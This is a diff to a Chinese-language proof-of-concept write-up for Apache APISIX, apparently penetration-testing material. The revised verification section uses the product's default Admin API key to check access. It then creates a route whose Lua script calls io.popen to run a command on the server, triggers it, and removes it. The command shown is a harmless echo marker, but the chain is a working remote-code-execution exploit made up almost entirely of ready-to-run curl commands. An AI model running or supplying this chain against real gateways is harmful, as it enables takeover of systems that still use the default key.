@@ -113,14 +113,19 @@ curl -X POST "http://target:9080/apisix/batch-requests" \
 ## 验证方法
 
 ```bash
-# 验证默认Admin API密钥有效
-curl -s -o /dev/null -w "%{http_code}" "http://target:9180/apisix/admin/routes" \
+# 默认密钥：响应体是 routes 列表 JSON，含 total / list 字段，list 元素带 value.id、value.uri
+curl -s "http://target:9180/apisix/admin/routes" \
   -H "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1"
-# 返回200表示默认密钥有效，401表示已更换
+# 反例：401 且响应体 {"error_msg":"failed to check token"}，属密钥已更换
 
-# 验证RCE路由创建成功后命令执行
-curl -s http://target:9080/rce
-# 返回uid=xxx表示RCE成功
+# RCE：先用默认密钥按 ## Payload 建路由（改成 echo 本次标记的无损命令），再触发
+curl -s -X PUT "http://target:9180/apisix/admin/routes/poc" \
+  -H "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1" \
+  -H "Content-Type: application/json" \
+  -d '{"uri":"/poc","script":"local h=io.popen(\"echo POC_TOKEN\");ngx.say(h:read(\"*a\"));h:close()","upstream":{"type":"roundrobin","nodes":{"127.0.0.1:1980":1}}}'
+curl -s "http://target:9080/poc"
+# 判据：响应体出现 POC_TOKEN；创建路由返回 200 不算，必须触发后拿到回显
+# 清理：curl -X DELETE "http://target:9180/apisix/admin/routes/poc" -H "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1"
 ```
 
 ## 指纹确认
